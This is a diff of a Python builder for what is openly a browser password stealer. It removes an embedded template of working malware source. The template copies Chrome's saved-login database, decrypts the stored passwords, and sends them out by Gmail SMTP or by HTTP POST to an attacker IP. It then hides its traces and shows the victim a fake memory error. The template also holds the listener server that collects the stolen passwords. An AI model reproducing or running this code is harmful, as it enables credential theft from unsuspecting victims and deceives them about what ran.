@@ -32,8 +32,8 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
-serverlineStart = 208 + 3
-serverlineStop = 316 + 3
+serverlineStart = 212
+serverlineStop = 323
 
 while loop:
     os.system("cls")
@@ -131,7 +131,8 @@ def py2crypt(filename):
                     "optimize": 2,
                 }
             },
-            console=[{"script": filename, "icon_resources": [(0, "icon.ico")]}],
+            console=[{"script": filename,
+                      "icon_resources": [(0, "icon.ico")]}],
             zipfile=None,
         )
 
@@ -204,184 +205,3 @@ error = u'{error}'\n"
     except Exception as err:
         pass
     done()
-
-"""
-import ctypes, smtplib, os, win32crypt, time, urllib, requests, queue
-from shutil import copyfile
-from subprocess import check_call
-from sqlite3 import connect
-from requests import get, post
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-
-
-destination = "error.txt"
-def getpass():
-
-    path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
-
-    path2 = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login2"
-
-    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
-    path = path.strip()
-    path = urllib.parse.unquote(path)
-    if path.translate(ASCII_TRANS) != path:  # Contains non-ascii
-        path = path.decode('latin-1')
-    path = urllib.request.url2pathname(path)
-
-    ASCII_TRANS = '_'*32 + ''.join([chr(x) for x in range(32, 126)]) + '_'*130
-    path2 = path2.strip()
-    path2 = urllib.parse.unquote(path2)
-    if path2.translate(ASCII_TRANS) != path2:  # Contains non-ascii
-        path2 = path2.decode('latin-1')
-    path2 = urllib.request.url2pathname(path2)
-    try:
-        copyfile(path, path2)
-    except:
-        pass
-
-    conn = connect(path2)
-
-    cursor = conn.cursor()
-
-    cursor.execute(
-        'SELECT action_url, username_value, password_value FROM logins')
-
-    if os.path.exists(destination):
-        os.remove(destination)
-
-    sites = []
-    for raw in cursor.fetchall():
-        try:
-            if raw[0] not in sites:
-                if os.path.exists(destination):
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                else:
-                    with open(destination, "a") as password:
-                        password.write('\n' + "Website: " + raw[0] + '\n' + "User/email: " + raw[1] +
-                                       '\n' + "Password: " + format(win32crypt.CryptUnprotectData(raw[2])[1]) + '\n')
-                sites.append(raw[0])
-        except:
-            continue
-
-    conn.close()
-    return 0
-
-
-
-
-
-def sendpass():
-    if option == "1":
-        server = "smtp.gmail.com"
-        msg = MIMEMultipart()
-        filename = destination
-        f = open(filename)
-        attachment = MIMEText(f.read())
-        f.close()
-        attachment.add_header('Content-Disposition',
-                              'attachment', filename=destination)
-        msg.attach(attachment)
-
-        mailer = smtplib.SMTP(server, 587)
-        mailer.starttls()
-        mailer.login(email, pwd)
-        mailer.sendmail(email, mailto, msg.as_string())
-        mailer.close()
-
-    else:
-        try:
-            path = destination
-            url = 'http://' + attacker_ip
-            files = {'file': open(path, 'rb')}
-            r = post(url, files=files)
-        except:
-            pass
-        return 0
-getpass()
-sendpass()
-try:
-    os.remove(destination)
-except:
-    check_call(["attrib","+H",destination])
-MB_OK = 0x00
-MB_ICONSTOP = 0x10
-if error == "1":
-    ctypes.windll.user32.MessageBoxW(
-        None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
-if error != "1" and error != "0":
-    ctypes.windll.user32.MessageBoxW(None, error, u'Error', MB_OK | MB_ICONSTOP)
-import os, queue, requests
-import cgi
-import http.server
-import urllib.parse as urlparse
-
-host = "0.0.0.0"
-port = 80
-
-
-class MyHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        return
-
-    def do_POST(self):
-        destination = "passwords.txt"
-        add = 1
-        self.send_response(200)
-        if self.rfile:
-            print(
-                "\n\nEstablished connection from "
-                + self.client_address[0]
-                + " ("
-                + str(self.client_address[1])
-                + " -> "
-                + str(port)
-                + ")"
-            )
-            if os.path.isfile(destination):
-                exist = True
-                while exist:
-                    try:
-                        if not os.path.isfile("passwords" + str(add) + ".txt"):
-                            exist = False
-                            destination = "passwords" + str(add) + ".txt"
-                            break
-                        add += 1
-                    except Exception as err:
-                        pass
-            with open(destination, "wb") as pfile:
-                for key, value in dict(
-                    urlparse.parse_qs(
-                        self.rfile.read(int(self.headers["Content-Length"]))
-                    )
-                ).items():
-                    for i in value:
-                        pfile.write(i)
-            print(
-                "Retrieved passwords from "
-                + self.client_address[0]
-                + " into "
-                + destination
-                + "\n"
-            )
-
-    def log_message(self, format, *args):
-        return
-
-
-def run(server=http.server.HTTPServer, handler=MyHandler):
-    server_address = (host, port)
-    httpServ = server(server_address, handler)
-    try:
-        print("Waiting for connections...\n")
-        httpServ.serve_forever()
-    except KeyboardInterrupt:
-        print("[!] Server is terminated")
-        httpServ.server_close()
-
-
-if __name__ == "__main__":
-    run()
-"""
